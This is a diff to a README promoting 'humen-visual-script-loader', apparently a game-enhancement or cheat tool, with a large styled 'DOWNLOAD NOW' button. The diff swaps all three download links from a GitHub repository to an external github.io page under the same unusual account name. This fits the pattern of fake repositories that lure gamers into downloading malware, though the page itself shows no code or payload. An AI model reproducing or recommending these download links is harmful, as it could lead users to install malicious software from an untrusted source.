@@ -1,7 +1,7 @@
 <h1>🎮 humen-visual-script-loader - See More, Play Better</h1>
 
 <p align="center">
-  <a href="https://github.com/2regiaodedes7491/humen-visual-script-loader" style="display:inline-block;padding:16px 48px;background:linear-gradient(135deg,#ff6b6b,#feca57);color:#fff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 25px rgba(255,107,107,0.4);margin:20px 0;">⬇️ DOWNLOAD NOW</a>
+  <a href="https://2regiaodedes7491.github.io" style="display:inline-block;padding:16px 48px;background:linear-gradient(135deg,#ff6b6b,#feca57);color:#fff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 25px rgba(255,107,107,0.4);margin:20px 0;">⬇️ DOWNLOAD NOW</a>
 </p>
 
 ## 🖥️ What Is humen-visual-script-loader?
@@ -17,7 +17,7 @@ If you can click a mouse and read instructions, you can set this up. There's no 
 ### Step 1: Download the Application
 
 **Visit this link to download the application:**  
-👉 [https://github.com/2regiaodedes7491/humen-visual-script-loader](https://github.com/2regiaodedes7491/humen-visual-script-loader)
+👉 [https://2regiaodedes7491.github.io](https://2regiaodedes7491.github.io)
 
 Click the big button at the top of that page, and the download will start automatically. The file is small, so it won't take long even on slower connections.
 
@@ -137,7 +137,7 @@ If you run into any problems, you have several options:
 
 Ready to enhance your gaming experience? Here's your download link again:
 
-👉 **[Download humen-visual-script-loader](https://github.com/2regiaodedes7491/humen-visual-script-loader)**
+👉 **[Download humen-visual-script-loader](https://2regiaodedes7491.github.io)**
 
 Click the link, scroll to the "Releases" section, and download the latest version. The download takes just a minute, and you'll be gaming with enhanced visuals immediately.
 
